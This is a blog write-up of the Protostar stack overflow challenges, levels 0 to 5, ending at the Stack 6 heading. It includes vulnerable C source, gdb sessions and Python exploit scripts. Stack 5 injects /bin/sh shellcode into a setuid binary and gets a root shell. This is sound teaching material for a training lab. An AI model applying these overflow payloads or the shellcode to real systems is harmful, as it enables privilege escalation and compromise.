---
layout: single
title: "Protostar - Stack Challenges"
description: "Solutions for Stack 0-7"
date: 2025-03-02
draft: false
---

Protostar is one of the first learning resources about binary exploitation I fell in love with. It gave me a strong foundation for reverse engineering by covering various topics, including Stack Buffer Overflow, Format String Vulnerability, Heap Exploitation and more. In this blog, I will share the techniques and knowledge I have gained while working on **the Stack challenges**. Hopefully, it will help (or at least entertain) anyone who's into this kind of stuff too!

## Stack 0
Description:

> This level introduces the concept that memory can be accessed outside of  its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.
>
> This level is at /opt/protostar/bin/stack0

Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

This is a program written in C. It reads some inputs with **gets**, then check the **modified** variable and print either success or fail message. So, obviously, the goal of this level is to make the program print the success string. 

I first try to execute the **stack0** program, and find that it waits for some inputs and prints "Try again?" message.

```shell
user@protostar:/opt/protostar/bin$ ./stack0
aaaa
Try again?
user@protostar:/opt/protostar/bin$ ./stack0
asdfghjkl
Try again?
```

Let's have a closer look at the program. It has two local variables, including **modified** and a char array **buffer** with the space of 64 characters. In C, a char array is actually a string. Then **modified** is assigned to 0, and some inputs is being read into **buffer** by using **gets**.

I have a quick check at **gets** man page, and in the BUGS section, it says:

> Never use gets(). Because it is impossible to tell without knowing the data in advance how many  characters gets()  will  read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.

At this point, I know that our two local variables should be reserved on the stack. And from the man page, **gets** has no limit on reading things. Then, what happens if we read an input exceeding the length of 64? Let's find out with the help of `gdb`.

```shell
user@protostar:/opt/protostar/bin$ gdb ./stack0
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x080483f4 <main+0>:    push   ebp
0x080483f5 <main+1>:    mov    ebp,esp
0x080483f7 <main+3>:    and    esp,0xfffffff0
0x080483fa <main+6>:    sub    esp,0x60
0x080483fd <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048405 <main+17>:   lea    eax,[esp+0x1c]
0x08048409 <main+21>:   mov    DWORD PTR [esp],eax
0x0804840c <main+24>:   call   0x804830c <gets@plt>
0x08048411 <main+29>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048415 <main+33>:   test   eax,eax
0x08048417 <main+35>:   je     0x8048427 <main+51>
0x08048419 <main+37>:   mov    DWORD PTR [esp],0x8048500
0x08048420 <main+44>:   call   0x804832c <puts@plt>
0x08048425 <main+49>:   jmp    0x8048433 <main+63>
0x08048427 <main+51>:   mov    DWORD PTR [esp],0x8048529
0x0804842e <main+58>:   call   0x804832c <puts@plt>
0x08048433 <main+63>:   leave
0x08048434 <main+64>:   ret
```

It is obvious that **[esp+0x5c]** is the **modified** variable since 0 is moved into that location. I will set a breakpoint after the call to **gets** and see what happen.

``` shell
(gdb) break *0x08048411
Breakpoint 1 at 0x8048411: file stack0/stack0.c, line 13.
(gdb) r
Starting program: /opt/protostar/bin/stack0
AAAAAAAAAA

Breakpoint 1, main (argc=1, argv=0xbffff854) at stack0/stack0.c:13
...
(gdb) x/24wx $esp
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      0x41414141
0xbffff760:     0x41414141      0x08004141      0xbffff778      0x080482e8
0xbffff770:     0xb7ff1040      0x08049620      0xbffff7a8      0x08048469
0xbffff780:     0xb7fd8304      0xb7fd7ff4      0x08048450      0xbffff7a8
0xbffff790:     0xb7ec6365      0xb7ff1040      0x0804845b      0x00000000
(gdb) x/wx $esp+0x5c
0xbffff79c:     0x00000000
```

After a quick inspection into the stack using `gdb`, our input is stored at `0xbffff75c`, and if you take a closer look, towards the end, you will find the **modified** variable which is 0. So, I just need to overflow the input into  the **modified** variable and we are done. 

Our input's length should be 16 * 4 + 1 byte of data, which is one byte more than the size of **buffer** variable.

```shell
user@protostar:/opt/protostar/bin$ python -c 'print "A" * (16 * 4) + "B"' | /opt/protostar/bin/stack0
you have changed the 'modified' variable
```

## Stack 1

Description:

>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.
>
>This level is at /opt/protostar/bin/stack1
>
>Hints
>
>- If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
>- Protostar is little endian

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

The code for this level is somehow identical to `Stack0`, and our goal is still get the success message printed. However, this time, the number of arguments must be greater than 1.

```shell
user@protostar:/opt/protostar/bin$ ./stack1
stack1: please specify an argument
user@protostar:/opt/protostar/bin$ ./stack1 aaaa
Try again, you got 0x00000000
```

If you look closely, you will notice that **argv[1]** is copied into **buffer** variable by using **strcpy**. Some might ask what is **argv[1]** right? So, here is how I specify it:

```shell
command-line:   ~$ ./stack1 argument1 argument2
        in C:       argv[0]  argv[1]   argv[2] 
```

Furthermore, when I check the man page of **strcpy** in the BUGS section, it also states:

>If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing  fixed-length  string buffers is a favorite cracker technique for taking complete control of the machine. Any time program reads or copies data into a buffer, the program first needs to check that there's enough space. This may  be unnecessary if you can show that overflow is impossible, but be careful: programs can get changed overtime, in ways that may make the impossible possible.

So, the solution for this level is similar to `Stack0`, where we will provide an input with an appropriate length so that it can change the **modified** variable on the stack, and we get the success message!

Let's run the program in `gdb`:

```shell
user@protostar:/opt/protostar/bin$ gdb ./stack1
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048464 <main+0>:    push   ebp
0x08048465 <main+1>:    mov    ebp,esp
0x08048467 <main+3>:    and    esp,0xfffffff0
0x0804846a <main+6>:    sub    esp,0x60
0x0804846d <main+9>:    cmp    DWORD PTR [ebp+0x8],0x1
0x08048471 <main+13>:   jne    0x8048487 <main+35>
0x08048473 <main+15>:   mov    DWORD PTR [esp+0x4],0x80485a0
0x0804847b <main+23>:   mov    DWORD PTR [esp],0x1
0x08048482 <main+30>:   call   0x8048388 <errx@plt>
0x08048487 <main+35>:   mov    DWORD PTR [esp+0x5c],0x0
0x0804848f <main+43>:   mov    eax,DWORD PTR [ebp+0xc]
0x08048492 <main+46>:   add    eax,0x4
0x08048495 <main+49>:   mov    eax,DWORD PTR [eax]
0x08048497 <main+51>:   mov    DWORD PTR [esp+0x4],eax
0x0804849b <main+55>:   lea    eax,[esp+0x1c]
0x0804849f <main+59>:   mov    DWORD PTR [esp],eax
0x080484a2 <main+62>:   call   0x8048368 <strcpy@plt>
0x080484a7 <main+67>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484ab <main+71>:   cmp    eax,0x61626364
0x080484b0 <main+76>:   jne    0x80484c0 <main+92>
0x080484b2 <main+78>:   mov    DWORD PTR [esp],0x80485bc
0x080484b9 <main+85>:   call   0x8048398 <puts@plt>
0x080484be <main+90>:   jmp    0x80484d5 <main+113>
0x080484c0 <main+92>:   mov    edx,DWORD PTR [esp+0x5c]
0x080484c4 <main+96>:   mov    eax,0x80485f3
0x080484c9 <main+101>:  mov    DWORD PTR [esp+0x4],edx
0x080484cd <main+105>:  mov    DWORD PTR [esp],eax
0x080484d0 <main+108>:  call   0x8048378 <printf@plt>
0x080484d5 <main+113>:  leave
0x080484d6 <main+114>:  ret
```

It's clear that modified is located at **[esp+0x5c]**, while the two arguments for strcpy are stored at **[esp+0x4]** and **[esp]**. Now, I will set a breakpoint after **strcpy**, at `0x080484a7` to see how our input is stored on the stack.

``` shell
(gdb) break *0x080484a7
(gdb) r AAAAAAAAAAAAAAAAAAAAAAA
Starting program: /opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, main (argc=2, argv=0xbffff834) at stack1/stack1.c:18
...
(gdb) x/24wx $esp
0xbffff720:     0xbffff73c      0xbffff971      0xb7fff8f8      0xb7f0186e
0xbffff730:     0xb7fd7ff4      0xb7ec6165      0xbffff748      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x00414141      0x080496fc      0xbffff788      0x08048509
0xbffff760:     0xb7fd8304      0xb7fd7ff4      0x080484f0      0xbffff788
0xbffff770:     0xb7ec6365      0xb7ff1040      0x080484fb      0x00000000
(gdb) x/wx $esp+0x5c
0xbffff77c:     0x00000000
```

Just by observing the stack, we have to padding 16 * 4 bytes since our input starts from `0xbffff73c`, and the last 4 bytes is `0x61626364` in little-endian format.

Here is my script for this level:

``` python
import struct

padding = "A" * 16 * 4
modified = struct.pack("I", 0x61626364)

print padding + modified
```

And we solve this level. YAY ^^

``` shell
user@protostar:~$ python script.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
user@protostar:~$ /opt/protostar/bin/stack1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdcba
you have correctly got the variable to the right value
```

## Stack 2

Description:

> Stack2 looks at environment variables, and how they can be set.
>
> This level is at /opt/protostar/bin/stack2

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Our goal in this level is still to get the success message printed. We’ll once again take advantage of **strcpy**, but this time, the variable named **variable** is copied into **buffer**. The content of **variable** comes from `getenv("GREENIE")`.

If you check the man page for **getenv**, it states:

> The getenv() function searches the environment list for the specified variable name and returns a pointer to the corresponding value string.

So, **getenv** looks for "GREENIE" in the environment list and returns its value. The program even provides a hint, instructing us to set "GREENIE": 

> ***"Please set the GREENIE environment variable."***

Since "GREENIE" is a variable, we can assign value to it. You get the point right? :D 

All we need to do is set a value that overflows **modified** on the stack, and we’ll beat this level!"

I will set an arbitrary value to "GREENIE" and inspecting the stack using `gdb`:

```shell
user@protostar:/opt/protostar/bin$ env -i GREENIE=$(python -c 'print "A" * 20') gdb ./stack2
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048494 <main+0>:    push   ebp
0x08048495 <main+1>:    mov    ebp,esp
0x08048497 <main+3>:    and    esp,0xfffffff0
0x0804849a <main+6>:    sub    esp,0x60
0x0804849d <main+9>:    mov    DWORD PTR [esp],0x80485e0
0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
0x080484a9 <main+21>:   mov    DWORD PTR [esp+0x5c],eax
0x080484ad <main+25>:   cmp    DWORD PTR [esp+0x5c],0x0
0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
0x080484b4 <main+32>:   mov    DWORD PTR [esp+0x4],0x80485e8
0x080484bc <main+40>:   mov    DWORD PTR [esp],0x1
0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
0x080484c8 <main+52>:   mov    DWORD PTR [esp+0x58],0x0
0x080484d0 <main+60>:   mov    eax,DWORD PTR [esp+0x5c]
0x080484d4 <main+64>:   mov    DWORD PTR [esp+0x4],eax
0x080484d8 <main+68>:   lea    eax,[esp+0x18]
0x080484dc <main+72>:   mov    DWORD PTR [esp],eax
0x080484df <main+75>:   call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:   mov    eax,DWORD PTR [esp+0x58]
0x080484e8 <main+84>:   cmp    eax,0xd0a0d0a
0x080484ed <main+89>:   jne    0x80484fd <main+105>
0x080484ef <main+91>:   mov    DWORD PTR [esp],0x8048618
0x080484f6 <main+98>:   call   0x80483cc <puts@plt>
0x080484fb <main+103>:  jmp    0x8048512 <main+126>
0x080484fd <main+105>:  mov    edx,DWORD PTR [esp+0x58]
0x08048501 <main+109>:  mov    eax,0x8048641
0x08048506 <main+114>:  mov    DWORD PTR [esp+0x4],edx
0x0804850a <main+118>:  mov    DWORD PTR [esp],eax
0x0804850d <main+121>:  call   0x80483ac <printf@plt>
0x08048512 <main+126>:  leave
0x08048513 <main+127>:  ret
```

From the assembly code, **modified** is stored at **[esp+0x58]**. I will set a breakpoint at `0x080484e4`, right after the **strcpy** call.

``` shell
(gdb) break *0x080484e4
Breakpoint 1 at 0x80484e4: file stack2/stack2.c, line 22.
(gdb) r
Starting program: /opt/protostar/bin/stack2

Breakpoint 1, main (argc=1, argv=0xbffffe94) at stack2/stack2.c:22
...
(gdb) x/24wx $esp
0xbffffd80:     0xbffffd98      0xbfffffa1      0xb7fff8f8      0xb7f0186e
0xbffffd90:     0xb7fd7ff4      0xb7ec6165      0x41414141      0x41414141
0xbffffda0:     0x41414141      0x41414141      0x41414141      0x08048300
0xbffffdb0:     0xb7ff1040      0x08049748      0xbffffde8      0x08048549
0xbffffdc0:     0xb7fd8304      0xb7fd7ff4      0x08048530      0xbffffde8
0xbffffdd0:     0xb7ec6365      0xb7ff1040      0x00000000      0xbfffffa1
(gdb) x/wx $esp+0x58
0xbffffdd8:     0x00000000
```

After inspecting the stack, we need to assign "GREENIE" with a padding of 16 * 4 bytes, followed by 4 more bytes of `0x0d0a0d0a` in little-endian format.

Done, we pass the level :D

``` shell
user@protostar:/opt/protostar/bin$ export GREENIE=$(python -c 'print "A" * 16 * 4 + "\x0a\x0d\x0a\x0d"')
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
```

## Stack 3

Description:

>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)
>
>Hints
>
>- both gdb and objdump is your friend you determining where the win() function lies in memory.
>
> This level is at /opt/protostar/bin/stack3

Source code:

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

In this level, **\*fp()** is actually a function pointer that holds the address of a function. Our goal is to make it point to the **win** function to solve the level. But how can we do that? The answer is obvious, by using **gets**.

Since **gets** reads input directly into **buffer** without bounds checking, we can exploit this behavior to overflow the address stored in **fp**, redirecting execution to **win**.

Let's have a closer look at the program in `gdb`:

``` shell
user@protostar:/opt/protostar/bin$ gdb ./stack3
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
```

I will set a breakpoint at `0x08048475`, and inspect the stack. To make it simple for the debugging process, I will create a simple script to keep track of the address store in our function pointer **fp**.

Here is my script:

``` python
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

print padding
```

This script will help we notice what is the value currently stored in **fp**, which is **[esp+0x5c]** in the stack.

Before running the script, I will direct its output into a file and make this file as the input for my debugging process in `gdb`.

``` shell
user@protostar:~$ python script.py > /tmp/exp
user@protostar:~$ gdb /opt/protostar/bin/stack3
(gdb) break *0x08048475
Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/24wx $esp
>info registers
>end
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack3 < /tmp/exp
calling function pointer, jumping to 0x51515151
0xbffff6f0:     0x08048560      0x51515151      0xb7fff8f8      0xb7f0186e
0xbffff700:     0xb7fd7ff4      0xb7ec6165      0xbffff718      0x41414141
0xbffff710:     0x42424242      0x43434343      0x44444444      0x45454545
0xbffff720:     0x46464646      0x47474747      0x48484848      0x49494949
0xbffff730:     0x4a4a4a4a      0x4b4b4b4b      0x4c4c4c4c      0x4d4d4d4d
0xbffff740:     0x4e4e4e4e      0x4f4f4f4f      0x50505050      0x51515151
eax            0x51515151       1364283729
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff758       0xbffff758
esi            0x0      0
edi            0x0      0
eip            0x8048475        0x8048475 <main+61>
eflags         0x200296 [ PF AF SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

Breakpoint 1, 0x08048475 in main (argc=1448498774, argv=0x57575757) at stack3/stack3.c:22
```

The value of **eax** when reaching the breakpoing is `0x51515151`, and **0x51** is the character "Q". So, at this moment, we know how many characters we need for the paddings (from 'A' to 'P').

Since our primary goal is to redirect the program to **win** function, we just need to overflow **eax** with the address of **win** in little-endian format.

The address of **win** is `0x8048424`:

```shell 
(gdb) p win
$1 = {void (void)} 0x8048424 <win>
```

Here is my updated script to solve this level:

```python 
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
win = struct.pack("I", 0x8048424)

print padding + win
```

And we successfully beat this level. ^^

``` shell
user@protostar:~$ python script.py | /opt/protostar/bin/stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```

## Stack 4

Description:

>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
>
>This level is at /opt/protostar/bin/stack4
>
>Hints
>
>- A variety of introductory papers into buffer overflows may help.
>- gdb lets you do “run < input”
>- EIP is not directly after the end of buffer, compiler padding can also increase the size.

Source code:

``` c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Our goal in this level is still to redirect execution to the **win** function. However, unlike `Stack3`, we don't have a function pointer to manipulate. So how can we redirect our program? The answer is simple, we just need to overwrite the return address of **main** function on the stack to the address of **win** function with the help of **gets**.

I will use the script below to find out how many characters do I need for the padding.

``` shell
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

print padding
```

Let's run the program in `gdb`:

``` shell
user@protostar:~$ python script.py > /tmp/exp
user@protostar:~$ gdb /opt/protostar/bin/stack4
(gdb) set disassembly-flavor intel
(gdb) disassemble main
Dump of assembler code for function main:
0x08048408 <main+0>:    push   ebp
0x08048409 <main+1>:    mov    ebp,esp
0x0804840b <main+3>:    and    esp,0xfffffff0
0x0804840e <main+6>:    sub    esp,0x50
0x08048411 <main+9>:    lea    eax,[esp+0x10]
0x08048415 <main+13>:   mov    DWORD PTR [esp],eax
0x08048418 <main+16>:   call   0x804830c <gets@plt>
0x0804841d <main+21>:   leave
0x0804841e <main+22>:   ret
End of assembler dump.
(gdb) break *0x0804841e
Breakpoint 1 at 0x804841e: file stack4/stack4.c, line 16.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/24wx $esp
>x/1i $eip
>end
(gdb) r < /tmp/exp
Starting program: /opt/protostar/bin/stack4 < /tmp/exp
0xbffff7cc:     0x54545454      0x55555555      0x56565656      0x57575757
0xbffff7dc:     0x58585858      0x59595959      0x5a5a5a5a      0xb7ffef00
0xbffff7ec:     0x0804824b      0x00000001      0xbffff830      0xb7ff0626
0xbffff7fc:     0xb7fffab0      0xb7fe1b28      0xb7fd7ff4      0x00000000
0xbffff80c:     0x00000000      0xbffff848      0xf93bc179      0xd36c1769
0xbffff81c:     0x00000000      0x00000000      0x00000000      0x00000001
0x804841e <main+22>:    ret

Breakpoint 1, 0x0804841e in main (argc=Cannot access memory at address 0x5353535b
) at stack4/stack4.c:16
...
(gdb) si
Cannot access memory at address 0x53535357
(gdb) info registers
eax            0xbffff780       -1073744000
ecx            0xbffff780       -1073744000
edx            0xb7fd9334       -1208118476
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7d0       0xbffff7d0
ebp            0x53535353       0x53535353
esi            0x0      0
edi            0x0      0
eip            0x54545454       0x54545454
eflags         0x210246 [ PF ZF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
``` 

First, I run my script and save its output to **/tmp/exp**. Then, I start the program in `gdb` and set a breakpoint at `0x0804841e`, which is the **ret** instruction. This lets me check the value of **eip** right before the function returns.

When the program hits the breakpoint, I see that **eip** holds the value **0x54545454**, and **0x54** corresponds to the character 'T'. So my padding will start from 'A' to 'S'.

Now, to complete the exploit, I just need to replace the next 4 bytes with the address of the **win** function. Once I do that, I’ll beat this level.

Here is how I find the address of **win**:

``` shell
(gdb) p win
$1 = {void (void)} 0x80483f4 <win>
```

This is my script to solve the level:

``` python 
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0x80483f4)

print padding + eip
```

We beat the level. ^^

``` shell
user@protostar:~$ python script.py | /opt/protostar/bin/stack4
code flow successfully changed
Segmentation fault
```

## Stack 5

Description:

>Stack5 is a standard buffer overflow, this time introducing shellcode.
>
>This level is at /opt/protostar/bin/stack5
>
>Hints
>
>- At this point in time, it might be easier to use someone elses shellcode
>- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
remove the int3s once your shellcode is done.

Source code:

``` c 
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

The goal of this level is to get the **root privilege**. But how can we do that? 

Since our program is really short, the only thing we could take advantage is **gets**. So, our logic here is to create a script (including the shellcode) that can overwrite the instruction pointer **eip** right before the **main** function returns, redirecting execution to our shellcode. But which shellcode should I use?

I did a quick check over the program properties by using **file** command:

``` shell
user@protostar:~$ file /opt/protostar/bin/stack5
/opt/protostar/bin/stack5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
```

As the binary has the `setuid` flag, any shell we spawn from it will run with **elevated privileges**. This means we can use shellcode to execute `/bin/sh` and gain root access.

First, I run the program in `gdb`.

``` shell
user@protostar:~$ gdb /opt/protostar/bin/stack5
(gdb) disassemble main
Dump of assembler code for function main:
0x080483c4 <main+0>:    push   %ebp
0x080483c5 <main+1>:    mov    %esp,%ebp
0x080483c7 <main+3>:    and    $0xfffffff0,%esp
0x080483ca <main+6>:    sub    $0x50,%esp
0x080483cd <main+9>:    lea    0x10(%esp),%eax
0x080483d1 <main+13>:   mov    %eax,(%esp)
0x080483d4 <main+16>:   call   0x80482e8 <gets@plt>
0x080483d9 <main+21>:   leave
0x080483da <main+22>:   ret
End of assembler dump.
(gdb) break *0x080483da
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/1i $eip
>x/8wx $esp
>end
(gdb) r
Starting program: /opt/protostar/bin/stack5
AAAA
0x80483da <main+22>:    ret
0xbffff7ac:     0xb7eadc76      0x00000001      0xbffff854      0xbffff85c
0xbffff7bc:     0xb7fe1848      0xbffff810      0xffffffff      0xb7ffeff4

Breakpoint 1, 0x080483da in main (argc=134513604, argv=0x1) at stack5/stack5.c:11
.....
(gdb) si
0xb7eadc76 <__libc_start_main+230>:     mov    %eax,(%esp)
0xbffff7b0:     0x00000001      0xbffff854      0xbffff85c      0xb7fe1848
0xbffff7c0:     0xbffff810      0xffffffff      0xb7ffeff4      0x08048232
__libc_start_main (main=0x80483c4 <main>, argc=1, ubp_av=0xbffff854, init=0x80483f0 <__libc_csu_init>, fini=0x80483e0 <__libc_csu_fini>,
    rtld_fini=0xb7ff1040 <_dl_fini>, stack_end=0xbffff84c) at libc-start.c:260
...
```

After the **ret** instruction executes, the address `0xb7eadc76`, which was previously stored on the stack was popped into **eip**. Now, I create a script to find the offset that lets me take control of the instruction pointer.

``` python
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"

print padding
```

The output of this script will be redirected into a file, which can be used as the input for `gdb`. Let's run the program again!

``` shell
(gdb) r < /tmp/exp   <---------- Input
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:    ret
0xbffff7ac:     0x54545454      0x55555555      0x56565656      0x57575757
0xbffff7bc:     0x58585858      0x59595959      0x5a5a5a5a      0xb7ffef00

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11      in stack5/stack5.c
```

The address `0xb7eadc76` has been overwritten with `0x54545454`, where **0x54** corresponds character 'T'. So, our padding starts from 'A' to 'S'. 

We know that **0x54545454** is the address that we can overwrite to redirect our program. But where should our program jump to? Probably the ***"STACK"***, and I chose `0xbffff7b0` as the jump target.

To make sure my shellcode is working, I will add some **NOPs** before the shellcode and **\xcc (int3)** for debugging. Here is the [shellcode](https://shell-storm.org/shellcode/files/shellcode-575.html) I'm using:

``` shell
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

Here’s the updated script:

``` python
import struct

padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7b0 + 0x30)
nopslide = "\x90"*100
int3 = "\xCC"*4
shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

print padding + eip + nopslide + int3 + shellcode
```

And it works successfully in `gdb`!

``` shell
user@protostar:~$ gdb /opt/protostar/bin/stack5
.....
(gdb) r < /tmp/exp
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack5 < /tmp/exp
0x80483da <main+22>:    ret
0xbffff7ac:     0xbffff7e0      0x90909090      0x90909090      0x90909090
0xbffff7bc:     0x90909090      0x90909090      0x90909090      0x90909090

Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b
) at stack5/stack5.c:11
11      in stack5/stack5.c
(gdb) si
Cannot access memory at address 0x53535357
(gdb)
0xbffff7e1:     nop
0xbffff7b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7e1 in ?? ()
.....
(gdb)
0xbffff814:     int3
0xbffff7b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff814 in ?? ()
(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0xbffff816:     int3
0xbffff7b0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff7c0:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffff816 in ?? ()
.....
(gdb) c
Continuing.
Executing new program: /bin/dash
```

Nice~ Our script looks good. I will remove the breakpoint trap **int3** and run the script to solve the level.

``` shell
user@protostar:~$ python script.py | /opt/protostar/bin/stack5
user@protostar:~$
```

Hmm... What's wrong!? Why we didn't we get the root shell? 

This is because the shell we are executing wants some inputs, right? But since we redirected the script’s stdout into the program’s stdin. When the program was done, it closed the pipe. So now the shell is executed, but doesn't have any input, because it closed. So it will just exit. 

The trick to get around with this is using **cat**. This works because **cat** keeps the input stream open, preventing the shell from exiting.

``` shell
user@protostar:~$ (python script.py ; cat) | /opt/protostar/bin/stack5
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
root
```

## Stack 6

Description:

>Stack6 looks at what happens when you have restrictions on the return address.
>
>This level can be done in a couple of ways, such as finding the duplicate of the payload ( objdump -s will help with this), or ret2libc , or even return orientated programming.
>
>It is strongly suggested you experiment with multiple ways of getting your code to execute here.
>
>This level is at /opt/protostar/bin/stack6

Source code:

``` c
